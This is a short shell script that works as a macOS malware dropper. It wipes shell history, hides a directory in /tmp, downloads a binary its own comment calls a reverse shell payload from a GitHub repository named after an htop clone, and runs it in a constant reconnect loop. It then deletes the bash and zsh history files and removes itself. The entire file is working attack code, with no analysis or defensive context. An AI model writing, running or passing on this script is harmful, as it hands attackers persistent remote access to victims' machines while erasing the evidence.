#!/bin/sh

# Disable shell history
unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0

# Hidden temporary directory
TMP_DIR="/tmp/.sysd"
BIN_PATH="$TMP_DIR/shell"

# Create directory
mkdir -p "$TMP_DIR"

# Download macOS reverse shell payload
curl -s -L https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.macho -o "$BIN_PATH"

# Make executable
chmod +x "$BIN_PATH"

# Background loop to keep reconnecting
(
  while true; do
    "$BIN_PATH" >/dev/null 2>&1
    sleep 5
  done
) &

# Short delay
sleep 1

# Remove shell history (common shells)
rm -f ~/.bash_history ~/.zsh_history

# Self-delete script
[ -f "$0" ] && rm -- "$0"

exit 0
